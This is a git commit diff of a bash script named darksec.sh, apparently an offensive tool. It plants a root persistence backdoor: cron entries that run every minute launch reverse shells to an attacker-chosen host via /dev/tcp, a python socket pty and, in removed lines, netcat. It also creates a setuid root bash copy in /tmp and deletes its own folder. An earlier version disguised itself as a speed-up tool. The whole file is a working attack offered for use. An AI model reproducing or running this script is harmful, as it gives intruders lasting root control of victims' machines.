fbb6bc6bed6cdb3c1757b8da30c872e048ae38bf
DARKSEC <121623691+DARKSECshell@users.noreply.github.com>
2023-12-17 13:53:13 -0300

    darksec.sh

--- darksec.sh
+++ darksec.sh
@@ -1,47 +1,42 @@
 #!/bin/bash
 # DEVELOPER DARKSEC
-# THIS SCRIPT IS FOR A EXPLOIT FROM CRONTAB, SO WE WILL GET A REVERSE CONNECTION, WITH CRONTAB!
 # on the ip and port, choice the type from payload or connection reverse.
 # CREATE IN 2023 BY DARKSEC
 
 darksec="$PWD"
 
-echo "*******|-NEED RUN WITH ROOT!-|******"
-echo "HELLO FRIEND, HOW ARE YOU?"
-echo "========================"
-echo "1) GOOD"
-echo "2) BAD"
-echo "========================"
-read senso_de_humor
-echo "==========================="
-case $senso_de_humor in
-"1")
-        echo ":)"
-;;
-"2")
-        echo ":/"
-esac
-echo "==========================="
-echo "wait 1 minute..."
+echo '[+] RUNNING BACKDOOR'
+sleep 1
+
+# REVERSE SHELL WITH CRONTAB
 sed -i -e '$i\* * * * * root system.sh' /etc/crontab
 sed -i -e '$i\* * * * * root root.sh' /etc/crontab
 sleep 5
+
+# ENTER IN DIRETORY
 cd /usr/local/bin
 sleep 1
+echo 'WAIT...'
+
+# CREATE FILES FOR SHELL REVERSE
 touch system.sh
 echo "#\!/bin/bash" > /usr/local/bin/system.sh
-echo "nc 192.168.15.71 1234 -e /bin/bash" >> /usr/local/bin/system.sh # your ip here and your port :)
+echo "sh -i >& /dev/tcp/<YOUR IP>/1337 0>&1" >> /usr/local/bin/system.sh # your ip here and your port :)
 sleep 1
-echo "bash -i >& /dev/tcp/192.168.15.71/1234 0>&1" >> /usr/local/bin/system.sh # your ip here and your port :)
+echo "export RHOST="<YOUR IP>";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' &" >> /usr/local/bin/system.sh # your ip here and your port :)
 chmod +x /usr/local/bin/system.sh
 touch root.sh
 chmod +x /usr/local/bin/root.sh
 echo "#\!/bin/bash" > /usr/local/bin/root.sh
 echo "cp /bin/bash /tmp/root && chmod +xs /tmp/root" >> /usr/local/bin/root.sh
 sleep 1
-echo "wait..."
-sleep 3
+
+# BACK FOR  DIRETORY
 cd "$darksec"
 cd ..
+
+# DELETE BACKDOOR
 rm -rf shell_persistent
-echo "thanks your system is fast now!!"
+
+# SUCCESS, BACKDOOR RUNNING
+echo -n '[+] SUCCESS BACKDOOR RUNNING!'
